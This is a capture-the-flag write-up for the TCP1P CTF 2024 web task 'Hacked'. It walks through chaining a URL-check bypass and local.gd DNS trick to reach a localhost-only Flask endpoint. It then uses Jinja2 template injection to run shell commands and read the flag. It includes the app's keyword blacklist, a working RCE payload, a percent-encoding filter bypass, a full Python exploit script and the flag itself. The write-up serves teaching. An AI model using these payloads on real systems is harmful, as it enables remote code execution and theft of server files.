---
title: "[Web] Hacked - TCP1P CTF 2024: Exploring Nusantara's Digital Realm"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "ssti", "jinja2", "flask", "render-template", "nginx", "tcp1p-ctf-2024-exploring-nusan", "tcp1p-ctf-2024-exploring-nusantara", "2024", "ctf-writeup"]
summary: "![Zimzi's avatar](https://substack.com/@zimzi)"
source:
  name: "CTFtime writeup #39566"
  url: "https://ctftime.org/writeup/39566"
original_source: "https://zimzi.substack.com/p/tcp1p-ctf-2024-hacked"
ctf:
  name: "TCP1P CTF 2024: Exploring Nusantara's Digital Realm"
  year: 2024
  challenge: "[Web] Hacked"
---

## Metadata

- **CTF:** TCP1P CTF 2024: Exploring Nusantara's Digital Realm
- **Task:** [Web] Hacked
- **Author team:** Zimzi
- **CTFtime:** <https://ctftime.org/writeup/39566>
- **Original writeup:** <https://zimzi.substack.com/p/tcp1p-ctf-2024-hacked>

---
# TCP1P CTF 2024: Hacked

### [SSTI, localhost, url]

[![Zimzi's avatar](https://substackcdn.com/image/fetch/$s_!7J0a!,w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba6ea3a0-f2af-45ce-9f5d-82bf420f4890_1024x1024.png)](https://substack.com/@zimzi)

[Zimzi](https://substack.com/@zimzi)

Oct 18, 2024

Share

 _Description: My website is always being hacked by hackers >:(. That's why I created a very very very very secure website so they can't hack it again HAHAHAHA!!_

Link to [source code](https://github.com/TCP1P/TCP1P-CTF-2024-Challenges-Public/tree/main/Web/Hacked/).

Author: [daffainfo](https://twitter.com/daffainfo)

Organized by: 

[![](https://substackcdn.com/image/fetch/$s_!i7Gs!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F937c11ce-533b-496d-9088-518a903932c1_363x200.png)](https://substackcdn.com/image/fetch/$s_!i7Gs!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F937c11ce-533b-496d-9088-518a903932c1_363x200.png)

When we open the website it welcomes us with `Bad Request`.

[![](https://substackcdn.com/image/fetch/$s_!A-El!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8513560f-7cee-4762-9173-6f1ad5be95e7_601x171.png)](https://substackcdn.com/image/fetch/$s_!A-El!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8513560f-7cee-4762-9173-6f1ad5be95e7_601x171.png)

Let's look at the source code.

It is a Flask app. From a provided source code two files are significant for the solution:

`**app.py** ` - the main file with two endpoints:

  * function `**proxy()** ` decorated with **@check_forbidden_input,**

it implements**/** (GET) endpoint that takes query parameter `url`, 

the function constructs url from hardcoded value and user controlled parameter, it checks for whitelisted 2 endpoints, and pass constructed url to function `**proxy_req** `,

  * function `**dev_secret()** `decorated with **@is_from_localhost** ,

it implements /secret (GET, POST) endpoint with query parameter `admin`, 

it renders HTML template with text from the `admin` parameter,

  * function `**check_forbidden_input()** ` is a decorator that checks for blacklisted content in headers, parameters and body, it also forbids a user from sending blacklisted content.


`**utils.py** ` - with with helper functions:

  * function `**is_safe_url(url)** ` 

checks if its hostname does not contain blacklisted substrings,

  * function `**is_from_localhost(func)** `

it is a decorator that ensures the wrapped function is only called if the request originates from 127.0.0.1,

  * function **proxy_req(url)**

it uses the requests library to make an HTTP request to the specified url with the extracted method, headers, and data and disallow redirects.


The flag is stored in the 'flag.txt' file. It is also not an accident that the code implements the endpoint `/secret?admin=x` rendered by a template. So we have a general idea what to do.

## Overview

### Url filter bypass

The app.js code related to `proxy` function:

```
    @app.route('/', methods=['GET'])
    @check_forbidden_input
    def proxy():
        url = request.args.get('url')
    
        list_endpoints = [
            '/about/',
            '/portfolio/',
        ]
    
        if not url:
            endpoint = random.choice(list_endpoints)
            # Construct the URL with query parameter
            return redirect(f'/?url={endpoint}')
        
        target_url = "http://daffa.info" + url
    
        if target_url.startswith("http://daffa.info") and any(target_url.endswith(endpoint) for endpoint in list_endpoints):
            response, headers = **proxy_req**(target_url)
    
            return Response(response.content, response.status_code, headers.items())
        else:
            abort(403)
    
    blacklist = ["debug", "args", "headers", "cookies", "environ", "values", "query", "data", "form", "os", "system", "popen", "subprocess", "globals", "locals", "self", "lipsum", "cycler", "joiner", "namespace", "init", "join", "decode", "module", "config", "builtins", "import", "application", "getitem", "read", "getitem", "mro", "endwith", " ", "'", '"', "_", "{{", "}}", "[", "]", "\\", "x"]
```

First, let's send a request that passes validation in the proxy function and reaches the `proxy_req`. The code tries to blacklist many strings like space or 'x' in headers, parameters and body. It also checks if the url starts with "http://daffa.info" and ends with whitelisted endpoints: '/about/' or '/portfolio/'.

Let's send a request using curl to 'CTF_WEBPAGE?url=/about/'.

```
    curl 'CTF_WEBPAGE?url=/about/' 
    
    <html>
    <head><title>301 Moved Permanently</title></head>
    <body>
    <center><h1>301 Moved Permanently</h1></center>
    <hr><center>nginx/1.18.0 (Ubuntu)</center>
    </body>
    </html>
```

Text within this block will maintain its original spacing when published

```
     _This is a digression about this response:
    
    In the response we received status code 301 (Moved Permanently) . It may look concerning at first sight that why we haven't received the `http://daffa.info/about` page. When we look closer at the `prox_req` function we see that it prevents request from  being redirected.
    
    Fragment of `proxy_req` function:
    
     response = requests.request(
            method,
            url,
            headers=headers,
            data=data,
            verify=False,
            allow_redirects=False  # Prevent following redirects)
    
    When we send the same request from a browser, we can see that we are redirected to the same url, but upgraded from `http` to `https`. The redirect address is specified in `Response header` as the 'Location' header._
```

[![](https://substackcdn.com/image/fetch/$s_!-cuM!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc818185f-0112-4f90-a4b3-495b98ec89a1_1600x117.png)](https://substackcdn.com/image/fetch/$s_!-cuM!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc818185f-0112-4f90-a4b3-495b98ec89a1_1600x117.png) An illustration of the same request, but when redirections are allowed.

[![](https://substackcdn.com/image/fetch/$s_!dGar!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc5e899b3-2fab-4944-9dd9-73cd19a7dcf5_573x201.png)](https://substackcdn.com/image/fetch/$s_!dGar!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc5e899b3-2fab-4944-9dd9-73cd19a7dcf5_573x201.png)A response headers.

* * *

As a next step, let's experiment with the url. The code only checks the url start and end, so maybe we can send something more interesting than just 'CTF_WEBPAGE?url=/portfolio/.

The code that implements `url` check:

```
    if target_url.startswith("http://daffa.info") and any(target_url.endswith(endpoint) for endpoint in list_endpoints)
```

Let's try to access 'CTF_WEBPAGE?url=d.test.com/portfolio/'. The request resulted in an expected error, because this webpage doesn't exist. When we look closer we see that we reached a proxy_req stage and make a request. The url passed all filters. But why does this seem promising?

```
    'http://daffa.infod.test.com/portfolio/'
```

We connected to the main domain 'test.com' with the subdomain of 'daffa.infod' and the parameter 'portfolio'. We changed the main domain address!

### Admin secret

Taking first glance at the code of endpoint `secret`, we can see that it renders template with `admin` parameter using Jinja2 templates function `**render_template_string** `.

Using render_template_string with user-supplied parameters can lead to code injection vulnerabilities, as it allows execution of arbitrary code within the template. So the admin parameter will use SSTI (Server Side Template Injection) to read the flag file. 

If you would like to read a longer explanation about SSTI and render_template_string you can read my previous [article](https://zimzi.substack.com/p/bsidessf-2024-ctf-business-espense#:~:text=Second%2C%20we%20know,txt%27\).read\(\)%20%7C%20safe%7D%7D).

```
    def dev_secret():
        admin = "daffainfo"
        css_url = url_for('static', filename='css/main.css')
    
        if request.args.get('admin') is not None:
            admin = request.args.get('admin')
    
        if not admin:
            abort(403)
    
        template = '''<!DOCTYPE html>
             ...
            <body>
                <h1>NOTES!! ONLY ADMIN CAN ACCESS THIS AREA!</h1>
                <form action="" method="GET">
                    <label for="admin">Admin:</label>
                    <input type="text" id="admin" name="admin" required>
                    <br>
                    <input type="submit" value="Preview!">
                </form>
                <p>Admin: {}<span id="adminName"></span></p>
            </body>
            </html>'''.format(css_url, **admin**)
        return **render_template_string**(template)
```

The next thing that seems problematic is implemented in the function decorator. The endpoint tries to filter requests that are not made from the localhost.

```
    @app.route('/secret', methods=['GET', 'POST'])
    **@is_from_localhost**
    def dev_secret():
    ...
    
    Let's look at the is_from_localhost function.
    
    def is_from_localhost(func):
        @functools.wraps(func)
        def check_ip(*args, **kwargs):
            print(request.remote_addr)
            if request.remote_addr != '127.0.0.1':
                print("return abort(403) 1")
                return abort(403)
            print("return func(*args, **kwargs) 2")
            return func(*args, **kwargs)
        print("return check_ip 3")
        return check_ip
```

We can assume that there is only one host, so a potential request with localhost `http://127.0.0.1/secret?admin=[SSTI_PAYLOAD]` would return a flag. However we cannot exactly make above request, becuase of the filters.

The URL '<http://daffa.infod@127.0.0.1/portfolio/>' doesn't do the trick either, because proxy_request checks if the url is 'safe' - we cannot use numbers 0-9 and the word `localhost`.

Text within this block will maintain its original spacing when published

```
     _This is a digression how this payload with '@' works:
    
    The segment `daffa.infod` before the '@' symbol specifies a username for authentication purposes. However when we make a request this part doesn't influence the request. I sent this request to my  simple local server.
    
    response = requests.request(url='http://daffa.infod@127.0.0.1:2337', method='GET')
    DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:2337
    DEBUG:urllib3.connectionpool:http://127.0.0.1:2337 "GET / HTTP/1.1" 200 592
    
    Response from the simple server that runs on my localhost:
    
    python -m http.server 2337
    
    Serving HTTP on 0.0.0.0 port 2337 (http://0.0.0.0:2337/) 
    127.0.0.1 - - "GET / HTTP/1.1" 200_
```

The function `is_safe_url`:

```
    RESTRICTED_URLS = ['localhost', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    
    def **is_safe_url**(url):
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        if not hostname:
            return False
        for restricted_url in RESTRICTED_URLS:
            if restricted_url in hostname:
                print("if restricted_url in hostname:")
                print(restricted_url, hostname)
                return False
        return True
```

We have to find another way to get to localhost, to find an url that resolves to 127.0.0.1. 

In order to achieve this we can use the webpage: https://nip.io/. 

The webpage welcomes us with cheering info 'stop editing etc/hosts':

[![](https://substackcdn.com/image/fetch/$s_!-Fux!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0d278f60-2fb1-46e2-862c-468cd4280689_848x279.png)](https://substackcdn.com/image/fetch/$s_!-Fux!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0d278f60-2fb1-46e2-862c-468cd4280689_848x279.png)

When we scroll down we can see that there is a special case for 127.0.0.1 – local.gd.

```
    local.gd: Alternative to this service, where everything is mapped to localhost/127.0.0.1.
```

Let's combine everything we learn so far. 

```
    curl 'http://172.30.0.2:1337?url=d.local.gd:1337/secret?admin=XOXO/portfolio/' 
```

_*As webpage `local.gd` redirects subdomain to 127.0.0.1, we don't have to use a trick with @._

_**The localhost port 1337 is taken from docker configuration._

The server response:

```
    <!DOCTYPE html>
            ...
            <body>
                <h1>NOTES!! ONLY ADMIN CAN ACCESS THIS AREA!</h1>
                <form action="" method="GET">
                    <label for="admin">Admin:</label>
                    <input type="text" id="admin" name="admin" required>
                    <br>
                    <input type="submit" value="Preview!">
                </form>
                <p>Admin: XOXO/portfolio/<span id="adminName"></span></p>
            </body>
            </html># 
```

### Payload

Then, we prepare simple RCE for Jinja2 templates in the parameter `admin`.

```
    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}
```

We can see that some words used in our payload are in blacklist, however the url parameters can be urlencoded. We convert letters to ASCII and prefix with '%', so 'a' becomes '%61'. The encoded payload passes the blacklist.

## Solution

Let's combine everything together:

```
    import urllib.parse
    import requests
    
    def extended_url_encode(text):
        return ''.join('%{:02X}'.format(ord(char)) for char in text)
    
    text = r"""{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}"""
    
    encoded_text = extended_url_encode(text)
    
    url = 'http://ctf.tcp1p.team:10012'
    
    params = {
        'url': f'd.local.gd:1337/secret?admin={encoded_text}/portfolio/'
    }
    
    headers = {
        'Host': 'ctf.tcp1p.team',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': '127.0.0.1',
        'Accept-Encoding': None  # Explicitly set to None to remove it, so we don't hit the filter
    }
    
    response = requests.get(url, headers=headers, params=params, allow_redirects=True)
    
    print(response.text)
```

The response:

```
    <!DOCTYPE html>
    
    ...
               <p>Admin: app
    bin
    ...
    run
    s4aij7gf.txt
    sbin
    ...
    var
    /portfolio/<span id="adminName"></span></p>
    ...
    </html>
```

The 'flag.txt' is moved to the random named file, so it is named: 's4aij7gf.txt'.

The fragment of docker file responsible for this:

```
    # Copy and move flag
    COPY flag.txt /app/
    RUN mv flag.txt /$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1).txt
```

Let's read the file:

```
    text = r"""{{ self.__init__.__globals__.__builtins__.__import__('os').popen('**cat /s4aij7gf.txt** ').read() }}
```

And get a flag:

```
    <!DOCTYPE html>
            ...
            <body>
                <h1>NOTES!! ONLY ADMIN CAN ACCESS THIS AREA!</h1>
                <form action="" method="GET">
                    <label for="admin">Admin:</label>
                    <input type="text" id="admin" name="admin" required>
                    <br>
                    <input type="submit" value="Preview!">
                </form>
                <p>Admin: **TCP1P{Ch41n1ng_SsRF_pLu5_5St1_ba83f3ff121ba83f3ff121}** /portfolio/<span id="adminName"></span></p>
            </body>
            </html>
```

Let me know in the comments if you have any questions or if you’d like to see a solution to any other web CTF task!

Happy hacking! Bye bye!

Thanks for reading Zimzi’s Substack! Subscribe for free to receive new posts and support my work.

Share
